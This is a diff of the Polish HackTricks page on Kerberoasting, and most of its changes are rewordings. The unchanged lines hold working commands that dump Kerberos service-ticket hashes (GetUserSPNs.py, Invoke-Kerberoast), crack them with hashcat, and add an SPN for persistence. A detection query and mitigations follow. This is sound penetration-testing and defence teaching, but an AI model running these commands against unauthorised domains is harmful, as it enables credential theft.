@@ -1,6 +1,6 @@
 # Kerberoast
 
-<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować przepływy pracy** z wykorzystaniem najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
@@ -10,7 +10,7 @@ Otrzymaj dostęp już dziś:
 
 <details>
 
-<summary><strong>Zacznij od zera i zostań ekspertem AWS Red Team z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Zacznij od zera i zostań mistrzem hakowania AWS z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Inne sposoby wsparcia HackTricks:
 
@@ -24,15 +24,15 @@ Inne sposoby wsparcia HackTricks:
 
 ## Kerberoast
 
-Kerberoasting koncentruje się na pozyskiwaniu **biletów TGS**, szczególnie tych związanych z usługami działającymi na kontach **użytkowników** w **Active Directory (AD)**, wyłączając konta **komputerowe**. Szyfrowanie tych biletów wykorzystuje klucze pochodzące z **hasła użytkownika**, co umożliwia **offlineowe łamanie poświadczeń**. Użycie konta użytkownika jako usługi jest wskazane przez niepustą właściwość **"ServicePrincipalName"**.
+Kerberoasting koncentruje się na pozyskiwaniu **biletów TGS**, szczególnie tych związanych z usługami działającymi na **kontach użytkowników** w **Active Directory (AD)**, wyłączając **konta komputerowe**. Szyfrowanie tych biletów wykorzystuje klucze pochodzące z **hasła użytkownika**, co umożliwia **offlineowe łamanie poświadczeń**. Użycie konta użytkownika jako usługi jest wskazane przez niepusty atrybut **"ServicePrincipalName"**.
 
-Do wykonania **Kerberoastingu** niezbędne jest konto domeny zdolne do żądania biletów **TGS**; jednak ten proces nie wymaga **specjalnych uprawnień**, co czyni go dostępnym dla każdego z **ważnymi poświadczeniami domeny**.
+Aby wykonać **Kerberoasting**, niezbędne jest konto domeny zdolne do żądania **biletów TGS**; jednakże ten proces nie wymaga **specjalnych uprawnień**, co czyni go dostępnym dla każdego z **ważnymi poświadczeniami domeny**.
 
 ### Kluczowe punkty:
 
 * **Kerberoasting** celuje w **bilety TGS** dla **usług kont użytkowników** w **AD**.
 * Bilety szyfrowane kluczami z **haseł użytkowników** mogą być **łamane offline**.
-* Usługa jest identyfikowana przez niepustą właściwość **ServicePrincipalName**.
+* Usługa jest identyfikowana przez niepusty atrybut **ServicePrincipalName**.
 * Nie są wymagane **specjalne uprawnienia**, wystarczą **ważne poświadczenia domeny**.
 
 ### **Atak**
@@ -53,7 +53,7 @@ GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERN
 kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
 kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
 ```
-Narzędzia wielofunkcyjne obejmujące zrzut kerberoastable użytkowników:
+Wielofunkcyjne narzędzia obejmujące zrzut użytkowników podatnych na atak Kerberoast:
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
@@ -107,7 +107,7 @@ Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASC
 Podczas żądania TGS generowany jest Windows event `4769 - A Kerberos service ticket was requested`.
 {% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 Użyj [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks), aby łatwo tworzyć i **automatyzować workflows** oparte na najbardziej zaawansowanych narzędziach społeczności.\
@@ -123,39 +123,39 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ```
 ### Trwałość
 
-Jeśli masz **wystarczające uprawnienia** dla użytkownika, możesz go **zrobić kerberoastable**:
+Jeśli masz **wystarczające uprawnienia** dla użytkownika, możesz go uczynić **podatnym na atak Kerberoast**:
 ```bash
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
 Możesz znaleźć przydatne **narzędzia** do ataków **kerberoast** tutaj: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-Jeśli napotkasz ten **błąd** z systemu Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**, oznacza to problem z czasem lokalnym, który należy zsynchronizować z kontrolerem domeny. Istnieje kilka opcji:
+Jeśli napotkasz ten **błąd** z systemu Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Zbyt duże odchylenie zegara)`**, oznacza to problem z czasem lokalnym, który należy zsynchronizować z kontrolerem domeny. Istnieje kilka opcji:
 
 * `ntpdate <IP kontrolera domeny>` - Przestarzałe od wersji Ubuntu 16.04
 * `rdate -n <IP kontrolera domeny>`
 
 ### Zmniejszenie ryzyka
 
-Ataki kerberoast mogą być przeprowadzane z dużym stopniem skrytości, jeśli są wykonalne. Aby wykryć tę aktywność, należy zwrócić uwagę na **ID zdarzenia zabezpieczeń 4769**, które wskazuje, że żądano biletu Kerberos. Jednak z powodu dużej częstotliwości tego zdarzenia, należy zastosować konkretne filtry, aby wyodrębnić podejrzane działania:
+Atak **kerberoast** może być przeprowadzany z dużym stopniem skrytości, jeśli jest podatny na eksploatację. Aby wykryć tę aktywność, należy zwrócić uwagę na **Zdarzenie zabezpieczeń ID 4769**, które wskazuje, że żądany został bilet Kerberos. Jednak ze względu na wysoką częstotliwość tego zdarzenia, należy zastosować konkretne filtry, aby wyodrębnić podejrzane działania:
 
 * Nazwa usługi nie powinna być **krbtgt**, ponieważ jest to normalne żądanie.
 * Nazwy usług kończące się na **$** powinny być wykluczone, aby uniknąć uwzględniania kont komputerowych używanych do usług.
 * Żądania z maszyn powinny być odfiltrowane poprzez wykluczenie nazw kont sformatowanych jako **maszyna@domena**.
 * Należy rozważyć jedynie udane żądania biletów, zidentyfikowane przez kod błędu **'0x0'**.
-* **Najważniejsze**, typ szyfrowania biletu powinien być **0x17**, co często jest wykorzystywane w atakach kerberoast.
+* **Najważniejsze**, typ szyfrowania biletu powinien być **0x17**, co często jest wykorzystywane w atakach typu Kerberoasting.
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
 ```
-Do złagodzenia ryzyka związanego z Kerberoastingiem:
+Aby zmniejszyć ryzyko Kerberoastingu:
 
-* Upewnij się, że **Hasła kont usług** są trudne do odgadnięcia, zaleca się długość powyżej **25 znaków**.
-* Wykorzystaj **Zarządzane konta usług**, które oferują korzyści takie jak **automatyczne zmiany hasła** i **delegowane zarządzanie nazwami usługodawców (SPN)**, zwiększając bezpieczeństwo przed tego rodzaju atakami.
+* Upewnij się, że **Hasła kont usług** są trudne do odgadnięcia, zalecając długość powyżej **25 znaków**.
+* Wykorzystaj **Zarządzane konta usług**, które oferują korzyści takie jak **automatyczne zmiany hasła** i **delegowane zarządzanie nazwami usługowych principalnych (SPN)**, zwiększając bezpieczeństwo przed tego rodzaju atakami.
 
 Poprzez wdrożenie tych środków organizacje mogą znacząco zmniejszyć ryzyko związane z Kerberoastingiem.
 
 ## Kerberoast bez konta domeny
 
-We **wrześniu 2022**, nowy sposób eksploatacji systemu został ujawniony przez badacza o nazwie Charlie Clark, udostępniony poprzez jego platformę [exploit.ph](https://exploit.ph/). Ta metoda umożliwia pozyskanie **Biletów Usługi (ST)** poprzez żądanie **KRB\_AS\_REQ**, co nie wymaga kontroli nad żadnym kontem Active Directory. W zasadzie, jeśli podmiot jest skonfigurowany w taki sposób, że nie wymaga wstępnej autoryzacji - scenariusz podobny do znanego w świecie cyberbezpieczeństwa jako atak **AS-REP Roasting** - ta cecha może być wykorzystana do manipulacji procesem żądania. Konkretnie, poprzez zmianę atrybutu **sname** w ciele żądania, system jest oszukiwany, aby wydał **ST** zamiast standardowego zaszyfrowanego Biletu Granting Ticket (TGT).
+We **wrześniu 2022**, nowy sposób eksploatacji systemu został ujawniony przez badacza o nazwie Charlie Clark, udostępniony poprzez jego platformę [exploit.ph](https://exploit.ph/). Ta metoda umożliwia pozyskanie **Biletów Usługi (ST)** poprzez żądanie **KRB\_AS\_REQ**, co nie wymaga kontroli nad żadnym kontem Active Directory. W zasadzie, jeśli podmiot jest skonfigurowany w taki sposób, że nie wymaga wstępnej autoryzacji - scenariusz podobny do znanego w świecie cyberbezpieczeństwa jako atak **AS-REP Roasting** - ta cecha może być wykorzystana do manipulacji procesem żądania. Konkretnie, poprzez zmianę atrybutu **sname** w ciele żądania, system jest zmylany do wydania **ST** zamiast standardowego zaszyfrowanego Biletu Granting Ticket (TGT).
 
 Technika jest w pełni wyjaśniona w tym artykule: [wpis na blogu Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
 
@@ -195,7 +195,7 @@ Inne sposoby wsparcia HackTricks:
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) do łatwego tworzenia i **automatyzacji workflowów** z wykorzystaniem najbardziej zaawansowanych narzędzi społeczności.\
